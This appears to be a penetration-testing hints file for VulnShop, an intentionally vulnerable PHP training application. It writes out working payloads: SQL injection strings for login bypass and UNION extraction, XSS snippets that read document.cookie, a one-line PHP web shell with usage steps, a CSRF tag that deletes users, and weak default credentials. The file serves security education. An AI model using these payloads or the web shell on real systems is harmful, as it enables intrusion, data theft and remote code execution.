# VulnShop - Penetration Testing Hints

## 🎯 Overview
This document contains hints for discovering vulnerabilities in the VulnShop training application. Try to find them yourself first before consulting these hints!

---

## 🔍 Vulnerability Categories

### 1. SQL Injection

**Location**: Multiple pages (login.php, search.php, profile.php)

**Hints**:
- The login form doesn't properly sanitize user inputs
- Try entering SQL syntax in username/password fields
- Classic payload: `' OR '1'='1`
- Advanced: Try UNION-based injection in search
- Profile page has IDOR + SQL injection in the `id` parameter

**What to try**:
```
Username: admin' --
Password: anything

Search query: ' UNION SELECT username,password,email,role,bio,id FROM users--
```

**Expected Impact**: Bypass authentication, extract database contents, access other users' data

---

### 2. Cross-Site Scripting (XSS)

**Location**: search.php (Reflected), profile.php (Stored)

**Reflected XSS Hints**:
- Search results display user input without proper sanitization
- Try injecting HTML/JavaScript in the search query
- The page reflects your search term back to you

**What to try**:
```
Search: <script>alert('XSS')</script>
Search: <img src=x onerror=alert('XSS')>
```

**Stored XSS Hints**:
- User bio field stores data in the database
- Bio content is displayed without escaping
- Any user viewing the profile will execute the injected code

**What to try**:
```
Bio: <script>alert(document.cookie)</script>
Bio: <img src=x onerror=alert('Stored XSS')>
```

**Expected Impact**: Session hijacking, cookie theft, defacement

---

### 3. Insecure Direct Object Reference (IDOR)

**Location**: profile.php

**Hints**:
- User profiles are accessed via `?id=` parameter
- No authorization check to see if you should access that profile
- Try changing the ID to view other users' profiles
- Combine with SQL injection for more impact

**What to try**:
```
/profile.php?id=1
/profile.php?id=2
/profile.php?id=3
```

**Expected Impact**: Unauthorized access to other users' personal information

---

### 4. Unrestricted File Upload

**Location**: upload.php

**Hints**:
- No file type validation
- No file size restrictions
- Files are stored in a web-accessible directory
- Files are executed by the server

**What to try**:
1. Create a PHP web shell:
```php
<?php system($_GET['cmd']); ?>
```
2. Save as `shell.php`
3. Upload via the upload form
4. Access: `/uploads/shell.php?cmd=whoami`

**Expected Impact**: Remote code execution, full server compromise

---

### 5. Broken Access Control

**Location**: admin.php

**Hints**:
- Admin panel checks session role but authentication can be bypassed
- Use SQL injection to set your role to 'admin'
- No proper authorization framework

**What to try**:
1. Login with SQL injection and set role: `admin' AND '1'='1`
2. Or modify session if you can access it
3. Access `/admin.php` after gaining admin privileges

**Expected Impact**: Unauthorized administrative access, user management control

---

### 6. Cross-Site Request Forgery (CSRF)

**Location**: admin.php (delete function)

**Hints**:
- Delete user action has no CSRF token
- Action performed via GET request
- Can be triggered by visiting a malicious link

**What to try**:
Create an HTML page with:
```html
<img src="http://localhost:8080/admin.php?delete=2">
```
If an admin visits this page while logged in, user ID 2 will be deleted.

**Expected Impact**: Unauthorized actions performed on behalf of authenticated users

---

### 7. Information Disclosure

**Location**: config.php.bak

**Hints**:
- Backup files are often left on servers
- Check for common backup extensions: .bak, .backup, .old
- nginx is configured to serve these files
- Contains sensitive configuration data

**What to try**:
```
http://localhost:8080/config.php.bak
```

**Expected Impact**: Exposure of database credentials, API keys, backdoor accounts

---

### 8. Weak Authentication

**Location**: Database users table

**Hints**:
- Passwords stored in plaintext
- Common/weak default passwords
- No password complexity requirements
- No account lockout mechanism

**Default Credentials**:
```
admin:admin123
john:password
alice:123456
bob:qwerty
```

**Expected Impact**: Easy account compromise, credential stuffing attacks

---

### 9. Security Misconfiguration

**Location**: nginx configuration, PHP settings

**Hints**:
- X-Frame-Options allows framing (clickjacking)
- Backup files are served by web server
- Directory listing might be enabled
- Overly permissive file permissions (777)

**Expected Impact**: Multiple attack vectors, information disclosure

---

### 10. Missing Security Headers

**Location**: All pages

**Hints**:
- No Content-Security-Policy
- No X-XSS-Protection
- No Strict-Transport-Security
- Allows iframe embedding

**What to check**:
Use browser developer tools or curl to inspect HTTP headers

**Expected Impact**: Makes XSS and other attacks easier to execute

---

## 🔧 Tools to Use

1. **Burp Suite Community Edition**: Intercept and modify HTTP requests
2. **SQLMap**: Automated SQL injection testing
3. **Browser DevTools**: Inspect requests, modify cookies, view source
4. **curl**: Manual HTTP request testing
5. **Nikto**: Web server scanner
6. **OWASP ZAP**: Web application security scanner

---

## 📚 Learning Path

**Beginner**:
1. Try default credentials
2. Find the backup file
3. Test basic SQL injection on login

**Intermediate**:
4. Exploit IDOR to view other profiles
5. Test reflected XSS in search
6. Upload a text file

**Advanced**:
7. Extract database via SQL injection
8. Upload and execute PHP shell
9. Chain IDOR + SQL injection
10. Create CSRF proof of concept

---

## ⚠️ Important Notes

- This environment is for **education only**
- Never use these techniques on systems you don't own
- Always get explicit permission before testing
- Some vulnerabilities can be chained together for greater impact
- Document your findings as you would in a real penetration test

---

## 🏆 Challenge Goals

- [ ] Successfully login as admin without knowing the password
- [ ] Extract all usernames and passwords from the database
- [ ] Execute JavaScript on another user's browser
- [ ] View another user's private profile information
- [ ] Upload and execute a web shell
- [ ] Access the admin panel
- [ ] Find the hidden backup configuration file
- [ ] Demonstrate a CSRF attack

---

## 📖 Further Reading

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTheBox: https://www.hackthebox.com/
- PentesterLab: https://pentesterlab.com/

Good luck with your training! 🎓
